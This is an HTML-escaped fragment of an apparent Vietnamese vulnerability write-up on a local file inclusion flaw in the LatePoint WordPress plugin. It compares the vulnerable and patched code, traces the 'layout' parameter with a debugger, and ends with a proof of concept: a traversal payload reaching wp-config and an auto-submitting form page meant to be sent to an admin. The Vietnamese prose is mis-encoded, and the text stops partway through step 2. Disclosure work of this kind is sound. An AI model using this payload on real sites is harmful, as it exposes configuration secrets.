height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;LatePoint&lt;/strong&gt;: &lt;strong&gt;5.1.93&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;5.1.94&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function render($view, $layout = &amp;#39;none&amp;#39;, $extra_vars = array()){&#xA;    $this-&amp;gt;vars[&amp;#39;route_name&amp;#39;] = $this-&amp;gt;route_name;&#xA;    extract($extra_vars);&#xA;    extract($this-&amp;gt;vars);&#xA;    ob_start();&#xA;    if($layout != &amp;#39;none&amp;#39;){&#xA;      // rendering layout, view variable will be passed and used in layout file&#xA;      include LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $this-&amp;gt;add_extension($layout, &amp;#39;.php&amp;#39;);&#xA;    }else{&#xA;      include $this-&amp;gt;add_extension($view, &amp;#39;.php&amp;#39;);&#xA;    }&#xA;    $response_html = ob_get_clean();&#xA;    return $response_html;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, h√†m &lt;code&gt;render()&lt;/code&gt; g·∫Øn &lt;code&gt;.php&lt;/code&gt; v√†o &lt;code&gt;$layout&lt;/code&gt; v√† &lt;code&gt;include&lt;/code&gt; tr·ª±c ti·∫øp m√† kh√¥ng ki·ªÉm tra, d·∫´n ƒë·∫øn &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt; n·∫øu &lt;code&gt;$layout&lt;/code&gt; b·ªã ki·ªÉm so√°t t·ª´ ƒë·∫ßu v√†o.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function render($view, $layout = &amp;#39;none&amp;#39;, $extra_vars = array()){&#xA;    $this-&amp;gt;vars[&amp;#39;route_name&amp;#39;] = $this-&amp;gt;route_name;&#xA;    extract($extra_vars);&#xA;    extract($this-&amp;gt;vars);&#xA;    ob_start();&#xA;    if($layout != &amp;#39;none&amp;#39;){&#xA;&#x9;&#x9;$layout_path = $this-&amp;gt;get_safe_layout_path($layout);&#xA;      // rendering layout, view variable will be passed and used in layout file&#xA;      if($layout_path){&#xA;&#x9;&#x9;  include $layout_path;&#xA;      }else{&#xA;&#x9;&#x9;  __(&amp;#39;Invalid layout&amp;#39;, &amp;#39;latepoint&amp;#39;);&#xA;      }&#xA;    }else{&#xA;      include $this-&amp;gt;add_extension($view, &amp;#39;.php&amp;#39;);&#xA;    }&#xA;    $response_html = ob_get_clean();&#xA;    return $response_html;&#xA;}&#xA;&#xA;private function get_safe_layout_path($layout) {&#xA;    // 1. Remove any path separators and null bytes&#xA;    $layout = str_replace([&amp;#39;/&amp;#39;, &amp;#39;\\&amp;#39;, &amp;#34;\0&amp;#34;], &amp;#39;&amp;#39;, $layout);&#xA;&#xA;    // 2. Remove any dots to prevent directory traversal&#xA;    $layout = str_replace(&amp;#39;.&amp;#39;, &amp;#39;&amp;#39;, $layout);&#xA;&#xA;    // 3. Only allow alphanumeric, underscore, and hyphen&#xA;    $layout = preg_replace(&amp;#39;/[^a-zA-Z0-9_-]/&amp;#39;, &amp;#39;&amp;#39;, $layout);&#xA;&#xA;    // 4. Construct the full path&#xA;    $layout_file = $this-&amp;gt;add_extension($layout, &amp;#39;.php&amp;#39;);&#xA;    $full_path = LATEPOINT_VIEWS_LAYOUTS_ABSPATH . $layout_file;&#xA;&#xA;    // 5. Use realpath to resolve any remaining traversal attempts&#xA;    $real_path = realpath($full_path);&#xA;    $base_path = realpath(LATEPOINT_VIEWS_LAYOUTS_ABSPATH);&#xA;&#xA;    // 6. Ensure the resolved path is within the layouts directory&#xA;    if ($real_path &amp;amp;&amp;amp; $base_path &amp;amp;&amp;amp; strpos($real_path, $base_path) === 0) {&#xA;        return $real_path;&#xA;    }&#xA;&#xA;    return false;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ th√™m &lt;code&gt;get_safe_layout_path()&lt;/code&gt; ƒë·ªÉ lo·∫°i b·ªè &lt;code&gt;/&lt;/code&gt;, &lt;code&gt;\&lt;/code&gt;, &lt;code&gt;.&lt;/code&gt; v√† null byte; ch·ªâ cho ph√©p &lt;code&gt;[A-Za-z0-9_-]&lt;/code&gt;; x√¢y d·ª±ng ƒë∆∞·ªùng d·∫´n, d√πng &lt;code&gt;realpath()&lt;/code&gt; v√† so s√°nh v·ªõi &lt;code&gt;LATEPOINT_VIEWS_LAYOUTS_ABSPATH&lt;/code&gt;. N·∫øu h·ª£p l·ªá m·ªõi &lt;code&gt;include&lt;/code&gt;, ngƒÉn ch·∫∑n LFI.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;H√†m &lt;code&gt;render()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi t·∫°i &lt;strong&gt;12 v·ªã tr√≠ kh√°c nhau&lt;/strong&gt;, n√™n vi·ªác &lt;strong&gt;trace th·ªß c√¥ng&lt;/strong&gt; s·∫Ω r·∫•t m·∫•t th·ªùi gian.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/ref.png&#34;&#xA;    alt=&#34;12 v·ªã tr√≠ g·ªçi h√†m render()&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;12 v·ªã tr√≠ g·ªçi h√†m &lt;code&gt;render()&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;ƒê·ªÉ t·ªëi ∆∞u, ta s·ª≠ d·ª•ng &lt;strong&gt;debugger&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;ƒê·∫∑t &lt;strong&gt;breakpoint&lt;/strong&gt; trong h√†m &lt;code&gt;render()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Th·ª±c hi·ªán l·∫ßn l∆∞·ª£t c√°c thao t√°c trong giao di·ªán (UI).&lt;/li&gt;&#xA;&lt;li&gt;M·ªói khi &lt;code&gt;render()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi, ch∆∞∆°ng tr√¨nh s·∫Ω &lt;strong&gt;t·∫°m d·ª´ng t·∫°i breakpoint&lt;/strong&gt; v√† &lt;strong&gt;highlight&lt;/strong&gt; d√≤ng code t∆∞∆°ng ·ª©ng, gi√∫p x√°c ƒë·ªãnh nhanh lu·ªìng g·ªçi h√†m.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/scr.gif&#34;&#xA;    alt=&#34;Video debugger nh·∫£y ƒë·∫øn break point&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Video debugger nh·∫£y ƒë·∫øn break point&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ Khi truy c·∫≠p endpoint &lt;code&gt;http://localhost/wp-admin/admin.php?page=latepoint&amp;amp;route_name=calendars__view&lt;/code&gt; v·ªõi route name l√† c√°c submenu c·ªßa plugin th√¨ &lt;code&gt;render()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi v·ªõi layout m·∫∑c ƒë·ªãnh l√† &lt;code&gt;admin&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/default_layout.png&#34;&#xA;    alt=&#34;Layout m·∫∑c ƒë·ªãnh&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Layout m·∫∑c ƒë·ªãnh&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Quan s√°t callstack, ta th·∫•y ƒë∆∞·ª£c lu·ªìng g·ªçi h√†m ƒë·∫øn &lt;code&gt;render()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/callstack.png&#34;&#xA;    alt=&#34;Lu·ªìng g·ªçi h√†m trong callstack&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Lu·ªìng g·ªçi h√†m trong callstack&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;pre&gt;&lt;code&gt;function format_render_return($view_name, $extra_vars = array(), $json_return_vars = array(), $from_shared_folder = false){&#xA;  $html = &amp;#39;&amp;#39;;&#xA;  if($this-&amp;gt;get_return_format() == &amp;#39;json&amp;#39;){&#xA;    if(is_array($view_name)) $view_name = $view_name[&amp;#39;json_view_name&amp;#39;];&#xA;    $response_html = $this-&amp;gt;render($this-&amp;gt;get_view_uri($view_name, $from_shared_folder), &amp;#39;none&amp;#39;, $extra_vars);&#xA;    $this-&amp;gt;send_json(array_merge(array(&amp;#39;status&amp;#39; =&amp;gt; LATEPOINT_STATUS_SUCCESS, &amp;#39;message&amp;#39; =&amp;gt; $response_html), $json_return_vars));&#xA;  }else{&#xA;    if(is_array($view_name)) $view_name = $view_name[&amp;#39;html_view_name&amp;#39;];&#xA;    $this-&amp;gt;extra_css_classes[] = $this-&amp;gt;generate_css_class($view_name);&#xA;    $this-&amp;gt;vars[&amp;#39;extra_css_classes&amp;#39;] = $this-&amp;gt;extra_css_classes;&#xA;    $html = $this-&amp;gt;render($this-&amp;gt;get_view_uri($view_name, $from_shared_folder), $this-&amp;gt;get_layout(), $extra_vars);&#xA;  }&#xA;  return $html;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;render()&lt;/code&gt; ƒë∆∞·ª£c &lt;code&gt;format_render_return()&lt;/code&gt; g·ªçi khi &lt;code&gt;get_return_format()&lt;/code&gt; kh√¥ng ph·∫£i l√† &lt;code&gt;json&lt;/code&gt;, m·∫∑c ƒë·ªãnh n√≥ l√† &lt;code&gt;html&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$return_format = &amp;#39;html&amp;#39;&#xA;...&#xA;function get_return_format(){&#xA;  return $this-&amp;gt;return_format;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;layout&lt;/code&gt; m√† ta c·∫ßn quan t√¢m l√† gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa &lt;code&gt;get_layout()&lt;/code&gt; =&amp;gt; c√≥ &lt;code&gt;get_layout()&lt;/code&gt; th√¨ c≈©ng s·∫Ω c√≥ &lt;code&gt;set_layout()&lt;/code&gt;, ta t√¨m v·ªõi t·ª´ kh√≥a &lt;code&gt;set_layout&lt;/code&gt; trong c√πng file ƒë·ªÉ xem gi√° tr·ªã &lt;code&gt;layout&lt;/code&gt; ƒë∆∞·ª£c set nh∆∞ n√†o.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$layout = &amp;#39;admin&amp;#39;&#xA;...&#xA;function set_layout($layout = &amp;#39;admin&amp;#39;){&#xA;  if(isset($this-&amp;gt;params[&amp;#39;layout&amp;#39;])){&#xA;    $this-&amp;gt;layout = $this-&amp;gt;params[&amp;#39;layout&amp;#39;];&#xA;  }else{&#xA;    $this-&amp;gt;layout = $layout;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bi·∫øn &lt;code&gt;$layout&lt;/code&gt; ƒë∆∞·ª£c g√°n gi√° tr·ªã m·∫∑c ƒë·ªãnh l√† &lt;strong&gt;&lt;code&gt;&#39;admin&#39;&lt;/code&gt;&lt;/strong&gt;, t∆∞∆°ng ·ª©ng v·ªõi layout m√† ta ƒë√£ ph√¢n t√≠ch tr∆∞·ªõc ƒë√≥.&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;set_layout()&lt;/code&gt; c√≥ nhi·ªám v·ª• x√°c ƒë·ªãnh layout s·∫Ω s·ª≠ d·ª•ng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu trong &lt;code&gt;$this-&amp;gt;params&lt;/code&gt; c√≥ t·ªìn t·∫°i tham s·ªë &lt;code&gt;layout&lt;/code&gt;, th√¨ h√†m s·∫Ω d√πng gi√° tr·ªã ƒë√≥.&lt;/li&gt;&#xA;&lt;li&gt;Ng∆∞·ª£c l·∫°i, n·∫øu kh√¥ng c√≥, n√≥ s·∫Ω g√°n layout m·∫∑c ƒë·ªãnh (&lt;code&gt;&#39;admin&#39;&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ta ti·∫øp t·ª•c t·∫≠n d·ª•ng s·ª©c m·∫°nh c·ªßa &lt;strong&gt;debugger&lt;/strong&gt;, quan s√°t bi·∫øn &lt;code&gt;$params&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/params.png&#34;&#xA;    alt=&#34;Gi√° tr·ªã c·ªßa $params&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Gi√° tr·ªã c·ªßa &lt;code&gt;$params&lt;/code&gt;&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;$params&lt;/code&gt; bao g·ªìm 2 key l√† &lt;code&gt;page&lt;/code&gt; v√† &lt;code&gt;route_name&lt;/code&gt; t∆∞∆°ng ƒë∆∞∆°ng v·ªõi params string khi ta truy c·∫≠p endpoint &lt;code&gt;http://localhost/wp-admin/admin.php?page=latepoint&amp;amp;route_name=calendars__view&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;üëâ Nh∆∞ v·∫≠y &lt;code&gt;layout&lt;/code&gt; c≈©ng l√† param ƒë∆∞·ª£c truy·ªÅn trong URL, ta t·∫≠n d·ª•ng ƒëi·ªÅu n√†y ƒë·ªÉ khai th√°c.&lt;/p&gt;&#xA;&lt;p&gt;Th·ª≠ truy c·∫≠p endpoint tr√™n v·ªõi &lt;code&gt;layout&lt;/code&gt; param&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin.php?page=latepoint&amp;amp;route_name=calendars__view&amp;amp;layout=payload HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/admin.php?page=latepoint&#xA;Connection: keep-alive&#xA;Cookie: wordpress_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7Cc08cb50e24c24f218212642e90eebec4ec8ab1c3fb72a2443f62f3c27e253edd; wp-settings-time-1=1760795495; language=en; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1760967480%7CoCVvKc0bJQfyBklDsH6H9DopdAB5cs1Sto11eNkRdYj%7C2e46c824d8ba0f581459540ee6553fac38b1af797e42b03957dd3ab2a79a4175&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$layout&lt;/code&gt; ƒë√£ ƒë∆∞·ª£c ta ho√†n to√†n ki·ªÉm so√°t&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/layout.png&#34;&#xA;    alt=&#34;$layout ƒë∆∞·ª£c ki·ªÉm so√°t&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;&lt;code&gt;$layout&lt;/code&gt; ƒë∆∞·ª£c ki·ªÉm so√°t&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;T·∫°o trang web c√≥ form, t·ª± ƒë·ªông g·ª≠i request v·ªõi LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost:80/wp-admin/admin.php&amp;#34; method=&amp;#34;get&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;page&amp;#34; value=&amp;#34;latepoint&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;route_name&amp;#34; value=&amp;#34;calendars__view&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;layout&amp;#34; value=&amp;#34;../../../../../../wp-config&amp;#34;&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;        document.forms[0].submit()&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;G·ª≠i link ƒë·∫øn trang web cho admin ho·∫∑c ng∆∞·ªùi d√πng c√≥ ƒë·∫∑c 